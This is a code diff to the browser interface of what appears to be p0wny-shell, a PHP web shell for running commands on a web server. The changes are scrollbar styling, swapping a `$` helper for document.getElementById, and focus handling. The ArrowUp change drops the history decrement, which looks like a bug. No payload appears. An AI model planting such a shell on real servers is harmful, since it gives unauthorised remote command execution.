@@ -135,6 +135,22 @@ if (isset($_GET["feature"])) {
             	background-color: #bcbcbc;
             }
 
+            *::-webkit-scrollbar-track {
+                border-radius: 8px;
+                background-color: #353535;
+            }
+
+            *::-webkit-scrollbar {
+                width: 8px;
+                height: 8px;
+            }
+
+            *::-webkit-scrollbar-thumb {
+                border-radius: 8px;
+                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
+                background-color: #bcbcbc;
+            }
+
             #shell {
                 background: #222;
                 max-width: 800px;
@@ -276,9 +292,6 @@ if (isset($_GET["feature"])) {
             var eShellContent = null;
             var CMD_ENV = [];
             var promptAddEnv = "Type a comand...\nThis command will execute before your command.\nE.x: export HOME=\"/home/p0wny\"";
-            var $ = function (e) {
-                return document.getElementById(e);
-            } 
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -291,6 +304,10 @@ if (isset($_GET["feature"])) {
             function _insertStdout(stdout) {
                 eShellContent.innerHTML += escapeHtml(stdout);
                 eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _defer(callback) {
+                setTimeout(callback, 0);
             }
 
             function featureShell(command) {
@@ -422,7 +439,7 @@ if (isset($_GET["feature"])) {
             }
 
             function _updatePrompt() {
-                var eShellPrompt = $("shell-prompt");
+                var eShellPrompt = document.getElementById("shell-prompt");
                 eShellPrompt.innerHTML = genPrompt(CWD);
             }
 
@@ -436,8 +453,10 @@ if (isset($_GET["feature"])) {
                     case "ArrowUp":
                         if (historyPosition > 0) {
                             eShellCmdInput.blur();
-                            eShellCmdInput.value = commandHistory[--historyPosition];
-                            setTimeout(function() { eShellCmdInput.focus(); }, 10);
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                            _defer(function() {
+                                eShellCmdInput.focus();
+                            });
                         }
                         break;
                     case "ArrowDown":
@@ -502,14 +521,14 @@ if (isset($_GET["feature"])) {
                 if (CMD_ENV.indexOf(cmd) === -1) {
                     CMD_ENV.push(cmd);
                     
-                    var env_list = $("env-list");
+                    var env_list = document.getElementById("env-list");
                     if (env_list.options[env_list.selectedIndex].value === "") {
                         env_list.innerHTML = '';
                     }
                     env_list.insertAdjacentHTML( 'beforeend', '<option value="' + cmd + '" selected>$ ' + cmd + '</option>');
                     
-                    $("env-applied").innerHTML = CMD_ENV.length;
-                    $("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
+                    document.getElementById("env-applied").innerHTML = CMD_ENV.length;
+                    document.getElementById("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
                 }
             }
             
@@ -519,7 +538,7 @@ if (isset($_GET["feature"])) {
                     return;
                 }
                 
-                var env_list = $("env-list");
+                var env_list = document.getElementById("env-list");
                 var env_selected = env_list.options[env_list.selectedIndex];
                 var new_cmd = prompt(promptAddEnv, env_selected.value);
                 
@@ -540,7 +559,7 @@ if (isset($_GET["feature"])) {
             
             
             function _onRemoveEnvironment() {
-                var env_list = $("env-list");
+                var env_list = document.getElementById("env-list");
                 var index = env_list.selectedIndex;
                 
                 if (!CMD_ENV.length || !confirm("Are you sure want remove this command:\n$ " + env_list.options[index].value)) {
@@ -554,8 +573,8 @@ if (isset($_GET["feature"])) {
                     env_list.innerHTML = '<option value="" selected>no environment</option>';
                 }
                 
-                $("env-applied").innerHTML = CMD_ENV.length;
-                $("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
+                document.getElementById("env-applied").innerHTML = CMD_ENV.length;
+                document.getElementById("env-shell-prompt").setAttribute("title", CMD_ENV.length + " applied");
             }
             
             function attachEnvironment(cmd) {
@@ -575,19 +594,33 @@ if (isset($_GET["feature"])) {
                 }
 
                 if(!selection.toString()) {
-                    $('shell-cmd').focus();
+                    document.getElementById('shell-cmd').focus();
                 }
             }, false);
 
+            document.onclick = function(event) {
+                event = event || window.event;
+                var selection = window.getSelection();
+                var target = event.target || event.srcElement;
+
+                if (target.tagName === "SELECT") {
+                    return;
+                }
+
+                if (!selection.toString()) {
+                    eShellCmdInput.focus();
+                }
+            };
+
             window.onload = function() {
-                eShellCmdInput = $("shell-cmd");
-                eShellContent = $("shell-content");
+                eShellCmdInput = document.getElementById("shell-cmd");
+                eShellContent = document.getElementById("shell-content");
                 updateCwd();
                 eShellCmdInput.focus();
                 
-                $("env-add").addEventListener("click", function(){ _onAddEnvironment(); });
-                $("env-edit").addEventListener("click", function(){ _onEditEnvironment(); });
-                $("env-remove").addEventListener("click", function(){ _onRemoveEnvironment(); });
+                document.getElementById("env-add").addEventListener("click", function(){ _onAddEnvironment(); });
+                document.getElementById("env-edit").addEventListener("click", function(){ _onEditEnvironment(); });
+                document.getElementById("env-remove").addEventListener("click", function(){ _onRemoveEnvironment(); });
             };
         </script>
     </head>
